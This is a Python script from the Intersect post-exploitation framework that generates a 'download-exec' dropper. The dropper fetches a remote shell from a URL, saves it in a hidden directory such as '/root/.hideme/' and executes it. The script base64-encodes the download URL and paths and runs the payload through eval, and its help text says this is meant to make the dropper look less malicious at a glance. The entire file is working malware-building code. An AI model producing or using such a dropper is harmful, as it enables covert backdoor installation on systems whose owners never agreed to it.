#!/usr/bin/python
# Intersect Framework (c) 20120
# Simple web download-exec Intersect dropper
# dl's a remote Intersect shell, saves and executes


import os, sys
import argparse
import base64

Droppers = ("Scripts/Droppers/") 
 
 
help = """Once the generated dropper is executed on the target system, --url will be downloaded,
saved as --file in the --loc directory and then executed. In the dropper script, the download url
and file locations are encoded with base64. This serves to make the script less malicious at a casual
glance. """

parser = argparse.ArgumentParser(description=help, prog="dlexec")
parser.add_argument("--url", help="url download path [http://192.168.1.4/shell]", required=True)
parser.add_argument("--file", help="remote filename [notabackdoor]", required=True)
parser.add_argument("--loc", help="remote location [/root/.hideme/]", required=True)
args = parser.parse_args()

url = args.url
fname = args.file
loc = args.loc

if loc.endswith("/"):
    rpath = (loc+fname)
else:
    rpath = (loc+"/"+fname)

os.system("clear")
print("\n[*] Generating Intersect dropper with the following options: ")
print("  Download URL => %s" % url)
print("  Download Location => %s" % rpath)
print("  Local Filename => Scripts/Droppers/%s" % fname )

plaintext =("""u = urllib2.urlopen('%s')
if os.path.exists('%s') is False:
    os.mkdir('%s')
fin = open('%s', 'w')
fin.write(u.read())
fin.close()
if os.path.exists('%s'):
    subprocess.call(['python', '%s'])
""" % (url, loc, loc, rpath, rpath, rpath))

encode = base64.b64encode(plaintext)
#print("Base64 Encoded Dropper:\n %s" % encode)


try:
    fout = open(Droppers+fname, "w")
    fout.write("#!/usr/bin/python")
    fout.write("\nimport urllib2")
    fout.write("\nimport os, sys")
    fout.write("\nimport subprocess")
    fout.write("\nimport base64")
    fout.write("\n\nchunk = '%s'" % encode)
    fout.write("\nbuild = base64.b64decode(chunk)")
    fout.write("\neval(compile(build,'<string>', 'exec'))")
    fout.close()    
except:
    print("\n[!] Error writing %s to %s directory!" % (fname, Droppers))
    print("    Make sure you have the correct permissions.")
    sys.exit(0)

if os.path.exists(Droppers+fname):
    print("\n[*] Intersect dropper built!")
    print("    Location: Scripts/Droppers/%s" % fname)
else:
    print("\n[!] Something went wrong!")
    print("    New dropper did not save correctly. Try again.")
